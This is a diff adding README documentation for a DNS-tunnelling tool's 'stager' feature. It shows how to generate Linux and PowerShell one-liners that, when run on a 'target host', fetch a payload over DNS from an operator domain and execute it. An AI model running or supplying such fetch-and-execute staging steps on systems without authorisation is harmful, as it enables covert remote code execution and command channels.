@@ -49,6 +49,31 @@ python3 -m sfb.cli --role server --transport dns --domain t.example.com --stager
 ```
 Stager blobs embed a per-run index seed; older stager blobs are incompatible
 with the random index mapping and must be regenerated.
+Use `--passthrough` to embed args that will be passed to `sfb_flat.py` after
+the stager launches it. These args are appended after the fixed
+`--role alice --transport dns --domain <base_domain>` values; `--passthrough`
+must be last and must not include `--role`, `--transport`, or `--domain`.
+Example:
+```
+python3 -m sfb.cli --role server --transport dns --domain t.example.com --stager --passthrough --dns-resolver 203.0.113.1:53
+```
+Generated one-liners are written to `linux_dns_stager.txt` and
+`windows_dns_stager.txt` in the repo root. Run the last line from the
+appropriate file on the target host:
+```
+# Linux
+sh -c "$(tail -n 1 linux_dns_stager.txt)"
+```
+```
+# Windows (PowerShell)
+powershell -NoProfile -Command "Get-Content .\\windows_dns_stager.txt | Select-Object -Last 1 | Invoke-Expression"
+```
+Notes:
+- The stager uses system resolver detection only (`/etc/resolv.conf` on Linux,
+  `nslookup` on Windows) and always queries UDP/53 for the payload.
+- The stager base domain is taken from Bob's `--domain` at generation time.
+- The stager expects the server to use the same `--dns-cname-label` value
+  (CNAME suffix `<label>.<base_domain>`). Regenerate stagers if either changes.
 
 ## Profiling
 Use `--cprofile` to write a cProfile output file.
